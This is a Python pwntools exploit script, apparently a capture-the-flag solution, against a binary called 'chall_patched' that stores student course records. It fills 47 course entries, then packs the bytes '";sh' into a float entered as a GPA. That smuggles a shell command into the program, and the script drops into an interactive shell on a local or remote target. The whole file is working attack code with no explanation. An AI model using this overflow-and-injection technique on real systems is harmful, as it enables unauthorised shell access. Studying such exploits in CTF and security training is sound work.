#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


context.binary = exe
context.log_level = 'debug'

gdbscript="""b*_ZN7StudentD2Ev"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        # gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("host", port)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

def add(cred, year, gpa):
    sna(b'course? > ', cred)
    sna(b'? > ', year)
    sna(b'course? >', gpa)

sla(b'name?', b'admin')
sla(b'id:', b'123')

for i in range(47):
    add(4, 2025, 1)
    sla(b'(y/n) >', b'y')

cmd = b'";sh'
value = struct.unpack('<f', cmd)[0]
sna(b'How many credits is this course? > ', 4)
sna(b'What year did you take it? > ', ord('"'))
sla(b'What\'s your GPA in that course? >', f"{value:.6f}".encode())
sla(b'(y/n) >', b'n')

p.interactive()